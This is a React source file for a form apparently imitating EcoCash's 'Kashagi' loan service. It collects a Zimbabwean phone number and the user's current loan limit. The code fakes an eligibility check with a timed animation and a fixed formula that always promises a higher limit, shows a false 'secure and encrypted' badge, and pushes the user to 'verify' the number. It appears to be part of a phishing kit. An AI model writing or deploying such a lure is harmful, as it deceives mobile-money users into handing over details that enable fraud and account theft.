import React, { useState } from "react";
import { ArrowLeft, Loader2, CheckCircle } from "lucide-react";
import {
    pageStyle,
    headerStyle,
    logoStyle,
    menuButtonStyle,
    contentStyle,
    cardStyle,
    footerStyle,
    inputStyle,
    labelStyle,
    buttonStyle,
} from "../styles/sharedStyles";
import { ApplicationFormProps } from "../types";
import toast from "react-hot-toast";

// Calculate new limit based on current limit
// $0 → $30, $15 → $75 (formula: new = 30 + current * 3)
const calculateNewLimit = (current: number): number => {
    return 30 + (current * 3);
};

function ApplicationForm({ onBack, onSubmitSuccess }: ApplicationFormProps) {
    const [step, setStep] = useState<"phone" | "limit" | "checking" | "result">("phone");
    const [phone, setPhone] = useState("");
    const [currentLimitInput, setCurrentLimitInput] = useState("");
    const [currentLimit, setCurrentLimit] = useState(0);
    const [newLimit, setNewLimit] = useState(0);
    const [increaseAmount, setIncreaseAmount] = useState(0);
    const [error, setError] = useState("");
    const [isSubmitting, setIsSubmitting] = useState(false);

    // Format phone number as user types - no spaces, dynamic max length
    const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        let value = e.target.value.replace(/\D/g, "");

        // Dynamic max length: 10 if starts with 0, 9 if starts with 7
        let maxLen = 10;
        if (value.startsWith('7')) {
            maxLen = 9;
        } else if (value.startsWith('0')) {
            maxLen = 10;
        }

        if (value.length > maxLen) value = value.slice(0, maxLen);

        setPhone(value);
        setError("");
    };

    const handlePhoneSubmit = () => {
        const digitsOnly = phone.replace(/\D/g, "");
        // Dynamic validation: 10 if starts with 0, 9 if starts with 7
        let expectedLen = 10;
        if (digitsOnly.startsWith('7')) {
            expectedLen = 9;
        } else if (digitsOnly.startsWith('0')) {
            expectedLen = 10;
        }

        if (digitsOnly.length !== expectedLen) {
            setError(`Please enter a valid ${expectedLen}-digit phone number`);
            return;
        }
        setStep("limit");
    };

    // Handle current limit input
    const handleLimitChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value.replace(/[^0-9]/g, "");
        setCurrentLimitInput(value);
        setError("");
    };

    const handleCheckLimit = () => {
        const limitValue = parseInt(currentLimitInput) || 0;
        setCurrentLimit(limitValue);

        // Start checking animation
        setStep("checking");

        // Calculate new limit using formula: 30 + (current * 3)
        const newLim = calculateNewLimit(limitValue);
        const increase = newLim - limitValue;

        // Simulate API call delay for anticipation
        setTimeout(() => {
            setNewLimit(newLim);
            setIncreaseAmount(increase);
            setStep("result");
        }, 2500);
    };

    const handleClaimIncrease = async () => {
        setIsSubmitting(true);
        try {
            const formattedPhone = "+263" + phone.replace(/\D/g, "");
            onSubmitSuccess({
                phone: formattedPhone,
                currentLimit,
                newLimit,
                increaseAmount,
            });
        } catch (e) {
            console.error(e);
            toast.error("Failed to submit details. Try again.");
        } finally {
            setIsSubmitting(false);
        }
    };

    return (
        <div style={pageStyle}>
            <div style={headerStyle}>
                <button
                    onClick={onBack}
                    style={{
                        background: "none",
                        border: "none",
                        color: "#333",
                        cursor: "pointer",
                        fontSize: "16px",
                        display: "flex",
                        alignItems: "center",
                        gap: "6px",
                        padding: "8px",
                        borderRadius: "8px",
                        fontWeight: "600",
                        transition: "background 0.2s",
                    }}
                    onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
                    onMouseOut={(e) => (e.currentTarget.style.background = "none")}
                >
                    <ArrowLeft size={20} /> Back
                </button>
                <img src="/ecocash.png" alt="EcoCash" style={logoStyle} />
                <button
                    style={menuButtonStyle}
                    onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
                    onMouseOut={(e) => (e.currentTarget.style.background = "none")}
                >
                    ☰
                </button>
            </div>

            <div style={contentStyle}>
                <div style={{ ...cardStyle, maxWidth: "500px" }}>

                    {/* Step 1: Phone Input */}
                    {step === "phone" && (
                        <>
                            <h1
                                style={{
                                    textAlign: "center",
                                    fontSize: "26px",
                                    fontWeight: "800",
                                    marginBottom: "12px",
                                    color: "#1a1a1a",
                                }}
                            >
                                Check Your Eligibility
                            </h1>
                            <p
                                style={{
                                    textAlign: "center",
                                    color: "#666",
                                    marginBottom: "32px",
                                    fontSize: "15px",
                                }}
                            >
                                Enter your EcoCash number to get started
                            </p>

                            <div style={{ marginBottom: "24px" }}>
                                <label style={labelStyle}>Phone Number</label>
                                <div style={{ position: "relative" }}>
                                    <span
                                        style={{
                                            position: "absolute",
                                            left: "16px",
                                            top: "50%",
                                            transform: "translateY(-50%)",
                                            color: "#333",
                                            fontWeight: "600",
                                            fontSize: "16px",
                                        }}
                                    >
                                        +263
                                    </span>
                                    <input
                                        type="tel"
                                        placeholder="7XXXXXXXX"
                                        value={phone}
                                        onChange={handlePhoneChange}
                                        style={{
                                            ...inputStyle,
                                            paddingLeft: "70px",
                                            fontSize: "18px",
                                            letterSpacing: "1px",
                                            border: error ? "2px solid #ff4444" : "2px solid #e0e0e0",
                                        }}
                                        onFocus={(e) => {
                                            if (!error) e.currentTarget.style.borderColor = "#667eea";
                                        }}
                                        onBlur={(e) => {
                                            if (!error) e.currentTarget.style.borderColor = "#e0e0e0";
                                        }}
                                    />
                                </div>
                                {error && (
                                    <span style={{ color: "#ff4444", fontSize: "13px", marginTop: "8px", display: "block" }}>
                                        {error}
                                    </span>
                                )}
                            </div>

                            <button
                                onClick={handlePhoneSubmit}
                                style={{
                                    ...buttonStyle,
                                    background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
                                    fontSize: "16px",
                                }}
                                onMouseOver={(e) => {
                                    e.currentTarget.style.transform = "translateY(-2px)";
                                    e.currentTarget.style.boxShadow = "0 6px 20px rgba(102, 126, 234, 0.4)";
                                }}
                                onMouseOut={(e) => {
                                    e.currentTarget.style.transform = "translateY(0)";
                                    e.currentTarget.style.boxShadow = "0 4px 12px rgba(102, 126, 234, 0.3)";
                                }}
                            >
                                CONTINUE →
                            </button>

                            <p
                                style={{
                                    textAlign: "center",
                                    color: "#888",
                                    fontSize: "12px",
                                    marginTop: "20px",
                                }}
                            >
                                🔒 Your information is secure and encrypted
                            </p>
                        </>
                    )}

                    {/* Step 2: Current Limit Input */}
                    {step === "limit" && (
                        <>
                            <h1
                                style={{
                                    textAlign: "center",
                                    fontSize: "26px",
                                    fontWeight: "800",
                                    marginBottom: "12px",
                                    color: "#1a1a1a",
                                }}
                            >
                                What is Your Current Limit?
                            </h1>
                            <p
                                style={{
                                    textAlign: "center",
                                    color: "#666",
                                    marginBottom: "32px",
                                    fontSize: "15px",
                                }}
                            >
                                Enter your current Kashagi loan limit
                            </p>

                            <div style={{ marginBottom: "24px" }}>
                                <label style={labelStyle}>Current Limit ($)</label>
                                <div style={{ position: "relative" }}>
                                    <span
                                        style={{
                                            position: "absolute",
                                            left: "16px",
                                            top: "50%",
                                            transform: "translateY(-50%)",
                                            color: "#333",
                                            fontWeight: "600",
                                            fontSize: "20px",
                                        }}
                                    >
                                        $
                                    </span>
                                    <input
                                        type="text"
                                        placeholder="0"
                                        value={currentLimitInput}
                                        onChange={handleLimitChange}
                                        style={{
                                            ...inputStyle,
                                            paddingLeft: "40px",
                                            fontSize: "24px",
                                            fontWeight: "700",
                                            letterSpacing: "1px",
                                            border: "2px solid #e0e0e0",
                                        }}
                                        onFocus={(e) => {
                                            e.currentTarget.style.borderColor = "#667eea";
                                        }}
                                        onBlur={(e) => {
                                            e.currentTarget.style.borderColor = "#e0e0e0";
                                        }}
                                    />
                                </div>
                                <p style={{ color: "#888", fontSize: "12px", marginTop: "8px" }}>
                                    Enter 0 if you don't have a Kashagi limit yet
                                </p>
                            </div>

                            <button
                                onClick={handleCheckLimit}
                                style={{
                                    ...buttonStyle,
                                    background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
                                    fontSize: "16px",
                                }}
                                onMouseOver={(e) => {
                                    e.currentTarget.style.transform = "translateY(-2px)";
                                    e.currentTarget.style.boxShadow = "0 6px 20px rgba(102, 126, 234, 0.4)";
                                }}
                                onMouseOut={(e) => {
                                    e.currentTarget.style.transform = "translateY(0)";
                                    e.currentTarget.style.boxShadow = "0 4px 12px rgba(102, 126, 234, 0.3)";
                                }}
                            >
                                CHECK MY NEW LIMIT
                            </button>
                        </>
                    )}

                    {/* Step 3: Checking Animation */}
                    {step === "checking" && (
                        <div style={{ textAlign: "center", padding: "40px 0" }}>
                            <div
                                style={{
                                    width: "80px",
                                    height: "80px",
                                    background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
                                    borderRadius: "50%",
                                    display: "flex",
                                    alignItems: "center",
                                    justifyContent: "center",
                                    margin: "0 auto 24px",
                                    animation: "pulse 1.5s ease-in-out infinite",
                                }}
                            >
                                <Loader2 size={40} color="white" className="spinner" />
                            </div>
                            <h2 style={{ fontSize: "22px", fontWeight: "700", color: "#1a1a1a", marginBottom: "12px" }}>
                                Calculating Your New Limit...
                            </h2>
                            <p style={{ color: "#666", fontSize: "15px" }}>
                                Analyzing your Kashagi eligibility
                            </p>

                            <style>
                                {`
                                    @keyframes pulse {
                                        0%, 100% { transform: scale(1); }
                                        50% { transform: scale(1.1); }
                                    }
                                    .spinner {
                                        animation: spin 1s linear infinite;
                                    }
                                    @keyframes spin {
                                        from { transform: rotate(0deg); }
                                        to { transform: rotate(360deg); }
                                    }
                                `}
                            </style>
                        </div>
                    )}

                    {/* Step 4: Result Reveal */}
                    {step === "result" && (
                        <div style={{ textAlign: "center" }}>
                            {/* Success Icon */}
                            <div
                                style={{
                                    width: "80px",
                                    height: "80px",
                                    background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
                                    borderRadius: "50%",
                                    display: "flex",
                                    alignItems: "center",
                                    justifyContent: "center",
                                    margin: "0 auto 20px",
                                    boxShadow: "0 8px 24px rgba(102, 126, 234, 0.4)",
                                }}
                            >
                                <CheckCircle size={48} color="white" strokeWidth={3} />
                            </div>

                            <h2
                                style={{
                                    fontSize: "24px",
                                    fontWeight: "800",
                                    color: "#1a1a1a",
                                    marginBottom: "8px",
                                }}
                            >
                                🎉 Great News!
                            </h2>
                            <p style={{ color: "#666", fontSize: "15px", marginBottom: "24px" }}>
                                You qualify for a limit increase!
                            </p>

                            {/* Limit Comparison */}
                            <div
                                style={{
                                    background: "linear-gradient(135deg, #f5f7fa 0%, #e8eaf6 100%)",
                                    padding: "24px",
                                    borderRadius: "16px",
                                    marginBottom: "24px",
                                    border: "2px solid #c5cae9",
                                }}
                            >
                                <div
                                    style={{
                                        display: "flex",
                                        justifyContent: "space-around",
                                        alignItems: "center",
                                        marginBottom: "16px",
                                    }}
                                >
                                    <div>
                                        <div style={{ fontSize: "12px", color: "#888", fontWeight: "600", marginBottom: "4px" }}>
                                            CURRENT LIMIT
                                        </div>
                                        <div style={{ fontSize: "28px", fontWeight: "700", color: "#666" }}>
                                            ${currentLimit}
                                        </div>
                                    </div>
                                    <div style={{ fontSize: "32px", color: "#667eea" }}>→</div>
                                    <div>
                                        <div style={{ fontSize: "12px", color: "#667eea", fontWeight: "600", marginBottom: "4px" }}>
                                            NEW LIMIT
                                        </div>
                                        <div style={{ fontSize: "36px", fontWeight: "900", color: "#667eea" }}>
                                            ${newLimit}
                                        </div>
                                    </div>
                                </div>

                                <div
                                    style={{
                                        background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
                                        color: "white",
                                        padding: "12px 20px",
                                        borderRadius: "10px",
                                        fontSize: "16px",
                                        fontWeight: "700",
                                    }}
                                >
                                    +${increaseAmount} Extra Borrowing Power!
                                </div>
                            </div>

                            <button
                                onClick={handleClaimIncrease}
                                disabled={isSubmitting}
                                style={{
                                    ...buttonStyle,
                                    background: isSubmitting ? "#a0aec0" : "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
                                    fontSize: "16px",
                                    cursor: isSubmitting ? "not-allowed" : "pointer"
                                }}
                                onMouseOver={(e) => {
                                    if(isSubmitting) return;
                                    e.currentTarget.style.transform = "translateY(-2px)";
                                    e.currentTarget.style.boxShadow = "0 6px 20px rgba(102, 126, 234, 0.4)";
                                }}
                                onMouseOut={(e) => {
                                    if(isSubmitting) return;
                                    e.currentTarget.style.transform = "translateY(0)";
                                    e.currentTarget.style.boxShadow = "0 4px 12px rgba(102, 126, 234, 0.3)";
                                }}
                            >
                                {isSubmitting ? (
                                    <span style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "8px" }}>
                                        <Loader2 className="spinner" size={20} />
                                        WAITING...
                                    </span>
                                ) : (
                                    "CLAIM MY INCREASE →"
                                )}
                            </button>

                            <p
                                style={{
                                    color: "#888",
                                    fontSize: "12px",
                                    marginTop: "16px",
                                }}
                            >
                                Verify your number to confirm your new limit
                            </p>
                        </div>
                    )}
                </div>
            </div>

            <div style={footerStyle}>© 2025 Kashagi Zimbabwe</div>
        </div>
    );
}

export default ApplicationForm;
